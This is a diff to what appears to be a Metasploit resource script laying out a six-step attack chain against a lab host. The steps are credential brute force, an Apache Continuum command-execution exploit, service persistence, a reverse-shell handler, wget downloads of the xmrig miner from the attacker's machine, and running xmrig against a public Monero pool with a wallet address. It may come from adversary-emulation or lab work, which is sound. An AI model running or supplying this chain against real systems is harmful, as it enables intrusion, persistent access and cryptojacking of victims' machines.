@@ -10,7 +10,7 @@ set PASS_FILE /home/ahnafrr/Desktop/msf/unix_passwords_modified.txt
 run
 
 # ============================================================
-# STEP 2 - 
+# STEP 2 - Apache Continuum Command Execution
 # ============================================================
 
 use exploit/linux/http/apache_continuum_cmd_exec
@@ -20,7 +20,7 @@ set RHOSTS 192.168.56.181
 exploit -j -z
 
 # ============================================================
-# STEP 3 - 
+# STEP 3 - Service Persistence
 # ============================================================
 
 use exploit/linux/local/service_persistence
@@ -33,7 +33,7 @@ exploit -j -z
 sessions -k 1,2
 
 # ============================================================
-# STEP 4 - 
+# STEP 4 - Reverse Shell Handler
 # ============================================================
 
 use exploit/multi/handler
@@ -42,14 +42,17 @@ set LHOST 192.168.56.191
 exploit -j -z
 
 # ============================================================
-# STEP 5 - 
+# STEP 5 - Download Mining Files
 # ============================================================
 
 sessions -i 3
-wget --no-check-certificate http://{0}/downloads/xmrig
-wget --no-check-certificate http://{0}/downloads/config.json
-wget --no-check-certificate http://{0}/downloads/SHA256SUMS
+wget --no-check-certificate http://192.168.56.191:8000/downloads/xmrig
+wget --no-check-certificate http://192.168.56.191:8000/downloads/config.json
+wget --no-check-certificate http://192.168.56.191:8000/downloads/SHA256SUMS
 
 # ============================================================
-# STEP 6 - 
+# STEP 6 - Resource Hijacking
 # ============================================================
+
+chmod +x ./xmrig
+timeout 60s ./xmrig --donate-level 4 -o pool.minexmr.com:443 -u 44Hp1de8CprPz2K74U5ch4VssxZQUDjVrZWtgRScHZo83mb6D6cHfpLZg4zhaT1BvzJe5jdbPLHzqHp4jrx1hP6UHFCgWhN -k --tls
